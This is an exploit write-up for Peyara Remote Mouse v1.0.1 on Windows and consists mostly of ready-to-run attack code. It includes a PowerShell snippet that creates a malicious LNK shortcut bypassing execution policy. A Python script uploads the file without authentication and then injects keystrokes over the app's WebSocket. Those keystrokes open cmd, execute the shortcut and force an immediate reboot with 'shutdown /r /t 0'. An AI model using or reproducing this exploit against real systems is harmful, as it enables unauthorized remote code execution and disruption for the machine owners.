### Exploit Title: Peyara Remote Mouse v1.0.1 FILE UPLOAD
### Date: 2025-01-06
### Exploit Author: tmrswrr
### Software Link: https://peyara-remote-mouse.vercel.app/
### Platform: Windows
### Version: v1.0.1
### Tested on: Windows 10

```bash
USAGE : python3 combined_script.py <target_ip> <path_to_lnk_file>
```
"""
### Create Malicious LNK File (evil.lnk)
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\evil.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = '-NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"'
$Shortcut.WorkingDirectory = "%USERPROFILE%"
$Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,1"
$Shortcut.Save()
```

Exploit Flow: Upload evil.lnk via HTTP POST → Establish WebSocket → Simulate Ctrl+Esc + cmd + Enter → Execute LNK via for %i in ("%USERPROFILE%\Desktop\*evil.lnk") do start "" "%i"
You will be see opening calc.exe


"""
### EXPLOIT
```
#!/usr/bin/env python3
import asyncio
import websockets
import json
import argparse
import requests
import os


BOUNDARY = "rEZVajKDyijVrXLV2h8zOkgpm4x2NfDfmVs4UdvkPQwgoATx18zpO9ecnaRDQgVDjrOmpt"

def upload_file(target_ip, file_path):
    """Upload a file to the target server"""
    url = f"http://{target_ip}:1313/upload"
    filename = "evil.lnk"  
    

    try:
        with open(file_path, "rb") as f:
            file_content = f.read()
        print(f"Read {len(file_content)} bytes from {file_path}")
    except Exception as e:
        print(f"Error reading file: {e}")
        return False


    headers = {
        "Host": f"{target_ip}:1313",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Peyara/4 CFNetwork/1496.0.7 Darwin/23.5.0",
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }


    body = (
        f"--{BOUNDARY}\r\n"
        f'content-disposition: form-data; name="file"; filename="{filename}"; filename*=utf-8\'\'{filename}\r\n'
        f"content-type: application/octet-stream\r\n\r\n"
    ).encode() + file_content + f"\r\n--{BOUNDARY}--\r\n".encode()

    headers["Content-Length"] = str(len(body))


    try:
        print(f"Uploading {filename} to {url}...")
        response = requests.post(url, data=body, headers=headers)
        print(f"Upload Status: {response.status_code}")
        print(f"Response: {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"Upload failed: {e}")
        return False

async def execute_exploit(target_ip):
    """Execute the exploit via WebSocket"""
    uri = f"ws://{target_ip}:1313/socket.io/?EIO=4&transport=websocket"
    async with websockets.connect(uri) as ws:

        await ws.recv()  
        await ws.send("40")
        await ws.recv()  
        

        frame = await ws.recv()
        if frame == "2":
            await ws.send("3")  
        
        await asyncio.sleep(1)


        await ws.send('42["edit-key",{"key":"escape","modifier":["control"]}]')
        await asyncio.sleep(0.5)
        

        for key in ["c", "m", "d", "enter"]:
            await ws.send(f'42["key","{key}"]')
            await asyncio.sleep(0.2)
        await asyncio.sleep(1)
        

        run_cmd = r'for %i in ("%USERPROFILE%\Desktop\*evil.lnk") do start "" "%i"'
        for char in run_cmd:
            payload = '42' + json.dumps(["key", char])
            await ws.send(payload)
            await asyncio.sleep(0.1)
        

        await ws.send('42["key","enter"]')
        await asyncio.sleep(3)  
        

        restart_cmd = 'shutdown /r /t 0'
        for char in restart_cmd:
            await ws.send('42' + json.dumps(["key", char]))
            await asyncio.sleep(0.1)
        

        await ws.send('42["key","enter"]')
        print("[*] Files executed and restart command sent!")
        

        await asyncio.sleep(5)
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Upload and execute LNK file then restart target')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('file', help='Path to the LNK file to upload')
    args = parser.parse_args()
    

    if not upload_file(args.target, args.file):
        print("File upload failed. Exiting.")
        exit(1)
    
    print("File uploaded successfully. Starting exploit...")
    

    asyncio.get_event_loop().run_until_complete(execute_exploit(args.target))
```

 <img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara1.png" width="100%"></img>

